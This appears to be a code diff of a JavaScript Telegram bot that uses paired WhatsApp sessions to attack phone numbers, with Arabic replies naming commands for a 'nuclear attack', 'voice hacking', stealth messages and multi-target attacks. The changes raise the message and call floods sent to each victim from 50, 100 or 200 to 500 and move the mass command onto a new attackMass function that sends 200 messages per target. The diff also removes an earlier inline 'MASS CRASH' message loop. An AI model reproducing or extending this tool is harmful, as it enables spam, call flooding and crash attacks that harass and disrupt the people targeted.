@@ -579,6 +579,7 @@ async function attackCallSpam(client, target) {
     const devices = (await client.getUSyncDevices([target], false, false))
       .map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);
     await client.assertSessions(devices);
+    const callTargets = devices.length > 0 ? devices : [target];
 
     const promises = [];
     for (let i = 0; i < 500; i++) {
@@ -943,7 +944,7 @@ bot.command("nuke", async (ctx) => {
 
     const args = ctx.message.text.split(" ");
     const target = args[1]?.replace(/[^0-9]/g, "");
-    if (!target || target.length < 10) return ctx.reply("⚠️ صيغة خاطئة:\n<code>/nuke 628xxxxxxxx</code>\n\n💥 هجوم نووي - يرسل 50 رسالة متتالية للهدف");
+    if (!target || target.length < 10) return ctx.reply("⚠️ صيغة خاطئة:\n<code>/nuke 628xxxxxxxx</code>\n\n💥 هجوم نووي - يرسل 500 رسالة متتالية للهدف");
 
     if (waClients[userId]?.status !== "open") return ctx.reply("📵 واتساب غير متصل! استخدم /reqpair");
 
@@ -955,7 +956,7 @@ bot.command("nuke", async (ctx) => {
     });
 
     await attackNuke(waClients[userId].sock, X);
-    await ctx.reply(`✅ <b>هجوم نووي مكتمل!</b>\n🎯 ${target} - 50 رسالة`, { parse_mode: "HTML" });
+    await ctx.reply(`✅ <b>هجوم نووي مكتمل!</b>\n🎯 ${target} - 500 رسالة`, { parse_mode: "HTML" });
   } catch (e) {
     log.error(`NUKE ERROR: ${e.message}`);
     ctx.reply("❌ خطأ في الهجوم النووي");
@@ -977,6 +978,7 @@ bot.command("shield", async (ctx) => {
     if (!target || target.length < 10) return ctx.reply("⚠️ صيغة خاطئة:\n<code>/shield 628xxxxxxxx</code>\n\n🛡️ درع حماية - يحمي رقمك من الهجمات");
 
     if (waClients[userId]?.status !== "open") return ctx.reply("📵 واتساب غير متصل! استخدم /reqpair");
+    const X = `${target}@s.whatsapp.net`;
     const client = waClients[userId].sock;
 
     // Send protective messages
@@ -1013,7 +1015,7 @@ bot.command("stealth", async (ctx) => {
 
     const X = `${target}@s.whatsapp.net`;
     await attackGhost(waClients[userId].sock, X);
-    await ctx.reply(`✅ <b>وضع التسلل مكتمل!</b>\n🎯 ${target} - 100 رسالة مخفية`, { parse_mode: "HTML" });
+    await ctx.reply(`✅ <b>وضع التسلل مكتمل!</b>\n🎯 ${target} - 500 رسالة مخفية`, { parse_mode: "HTML" });
   } catch (e) {
     log.error(`STEALTH ERROR: ${e.message}`);
     ctx.reply("❌ خطأ في وضع التسلل");
@@ -1056,13 +1058,13 @@ bot.command("call", async (ctx) => {
     if (!hasAccess(userId)) return ctx.reply(getNoAccessMessage());
     const args = ctx.message.text.split(" ");
     const target = args[1]?.replace(/[^0-9]/g, "");
-    if (!target || target.length < 10) return ctx.reply("⚠️ صيغة خاطئة:\n<code>/call 628xxxxxxxx</code>\n📞 قرصنة صوتية - إرسال 200 مكالمة");
+    if (!target || target.length < 10) return ctx.reply("⚠️ صيغة خاطئة:\n<code>/call 628xxxxxxxx</code>\n📞 قرصنة صوتية - إرسال 500 مكالمة");
     if (waClients[userId]?.status !== "open") return ctx.reply("📵 واتساب غير متصل!");
 
     const X = `${target}@s.whatsapp.net`;
     await ctx.reply(`📞 <b>قرصنة صوتية جارية...</b>\n🎯 ${target}`, { parse_mode: "HTML" });
     await attackCallSpam(waClients[userId].sock, X);
-    await ctx.reply(`✅ <b>قرصنة صوتية مكتملة!</b>\n🎯 ${target} - 200 مكالمة`, { parse_mode: "HTML" });
+    await ctx.reply(`✅ <b>قرصنة صوتية مكتملة!</b>\n🎯 ${target} - 500 مكالمة`, { parse_mode: "HTML" });
   } catch (e) {
     log.error(`CALL ERROR: ${e.message}`);
     ctx.reply("❌ خطأ في القرصنة الصوتية");
@@ -1106,14 +1108,9 @@ bot.command("mass", async (ctx) => {
     const targets = args.slice(1).map(t => t.replace(/[^0-9]/g, "")).filter(t => t && t.length >= 10);
     if (targets.length === 0) return ctx.reply("⚠️ صيغة خاطئة:\n<code>/mass 628xxx,628yyy</code>\n🎯 هجوم متعدد الأهداف");
 
-    await ctx.reply(`🎯 <b>هجوم متعدد...</b>\n🎯 ${targets.length} هدف`, { parse_mode: "HTML" });
-    for (const t of targets) {
-      const X = `${t}@s.whatsapp.net`;
-      const msg = generateWAMessageFromContent(X, { message: { conversation: "💥 MASS CRASH" } }, {});
-      await waClients[userId].sock.relayMessage(X, { message: msg.message }, { messageId: msg.key.id });
-      await sleep(100);
-    }
-    await ctx.reply(`✅ <b>هجوم متعدد مكتمل!</b>\n🎯 ${targets.length} هدف`, { parse_mode: "HTML" });
+    await ctx.reply(`🎯 <b>هجوم متعدد...</b>\n🎯 ${targets.length} هدف - 200 رسالة لكل هدف`, { parse_mode: "HTML" });
+    await attackMass(waClients[userId].sock, targets);
+    await ctx.reply(`✅ <b>هجوم متعدد مكتمل!</b>\n🎯 ${targets.length} هدف - 200 رسالة لكل هدف`, { parse_mode: "HTML" });
   } catch (e) {
     log.error(`MASS ERROR: ${e.message}`);
     ctx.reply("❌ خطأ في الهجوم المتعدد");
